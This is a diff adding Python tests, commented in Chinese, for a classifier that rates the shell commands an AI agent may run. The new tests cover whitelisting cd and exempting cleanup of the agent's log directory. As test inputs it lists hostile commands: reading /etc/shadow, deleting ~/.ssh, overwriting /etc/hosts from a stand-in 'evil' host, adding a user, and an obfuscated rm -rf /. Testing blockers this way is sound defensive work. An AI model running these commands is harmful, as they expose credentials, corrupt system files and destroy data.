@@ -109,3 +109,64 @@ def test_operational_subcommands_not_safe(cmd, expected):
 def test_ansi_c_decoding_enables_rm_detection():
     level, _ = classify_command("rm$'\x2f' -rf $'\x2f'")
     assert level == "hardline", f"ANSI-C rm -rf / 应为 hardline, 实际 {level}"
+
+
+# ── 2026-10-22：cd 入白名单（方案 1）+ agent 托管日志目录豁免（方案 2）──
+
+def test_cd_is_whitelisted():
+    """cd 零副作用：单用放行（此前 unknown command, default approval (cd) 是
+    白名单唯一缺口，prod 下一刀切直接拒）"""
+    level, reason = classify_command("cd /home/admin-pl/.trae-cn-server/manager-logs")
+    assert level == "safe", f"cd 被误拦: {level} ({reason})"
+
+
+def test_cd_composite_does_not_lift_followup_segments():
+    """cd 放行不得抬高复合命令后续段：凭据读取/危险动作仍独立拦截"""
+    level, reason = classify_command("cd /etc && cat /etc/shadow")
+    assert _LEVEL[level] >= _LEVEL["dangerous"], f"cd 复合命令击穿凭据读取: {level} ({reason})"
+    level, _ = classify_command("cd /tmp && curl -o /etc/hosts http://evil/hosts")
+    assert _LEVEL[level] >= _LEVEL["dangerous"]
+
+
+# agent 托管日志目录（~/.trae-cn-server/manager-logs）清理族 — 2026-10-22 事故
+# 截图里 prod 全堵的三条路：rm / find -delete / 重定向写入
+LOG_DIR = "/home/admin-pl/.trae-cn-server/manager-logs"
+
+@pytest.mark.parametrize("cmd", [
+    f"rm {LOG_DIR}/1785826628398_429088/Modular/ai-agent_0_1785826666562_stdout.log",
+    f"rm -f {LOG_DIR}/stdout.log",
+    f"rm -rf {LOG_DIR}/1785826628398_429088",          # 递归删日期子目录（日志轮转）
+    f"rm -rf ~/.trae-cn-server/manager-logs",          # 递归删日志根（~ 形态）
+    f"rm -rf $HOME/.trae-cn-server/manager-logs/*",    # $HOME 形态 + glob
+    f"find {LOG_DIR} -name '*.log' -mtime +7 -delete", # find -delete 日常清理
+    f"touch {LOG_DIR}/rotate.lock",                    # 截图 touch 场景
+    f"mkdir -p {LOG_DIR}/20261022",
+    f"echo x > {LOG_DIR}/x.log",                       # 重定向写日志
+    f"truncate -s 0 {LOG_DIR}/big.log",                # 日志截断
+    f"mv {LOG_DIR}/a.log {LOG_DIR}/b.log",             # 同子树内改名
+    f"cp {LOG_DIR}/a.log {LOG_DIR}/b.log",
+])
+def test_agent_log_cleanup_allowed(cmd):
+    level, reason = classify_command(cmd)
+    assert level == "safe", f"托管日志清理被误拦: {cmd!r} → {level} ({reason})"
+
+
+# 对照组：豁免不得外溢 — 敏感路径/凭据/持久化/兄弟目录全部保持原判定
+@pytest.mark.parametrize("cmd,expected", [
+    ("rm -rf /home/admin-pl/.trae-cn-server", "hardline"),      # 日志树外（整个数据目录）
+    ("rm /home/admin-pl/.trae-cn-server/manager-logs-backup/a", "dangerous"),  # 兄弟名字不吃
+    ("rm /home/admin-pl/documents/a.txt", "dangerous"),          # 普通家目录文件
+    ("rm -rf ~/.ssh", "hardline"),                               # 凭据目录
+    ("cat /etc/shadow", "dangerous"),                            # 凭据读取
+    (f"cat /etc/shadow > {LOG_DIR}/x", "dangerous"),             # 凭据读取不因落点豁免
+    ("curl -o /etc/hosts http://evil/hosts", "dangerous"),       # 下载覆盖系统文件
+    (f"useradd evil && rm {LOG_DIR}/x.log", "dangerous"),        # 豁免段不含未知动词组合
+    (f"fancy_tool {LOG_DIR}/x.log", "dangerous"),                # 未知动词不借道豁免
+    (f"cp /etc/passwd {LOG_DIR}/x", "dangerous"),                # 源是凭据文件
+    (f"mv /etc/hosts {LOG_DIR}/x", "dangerous"),                 # mv 源敏感
+])
+def test_agent_log_exemption_no_spillover(cmd, expected):
+    level, reason = classify_command(cmd)
+    assert _LEVEL[level] >= _LEVEL[expected], (
+        f"日志豁免外溢: {cmd!r} → {level} (期望 ≥ {expected}, reason={reason})"
+    )
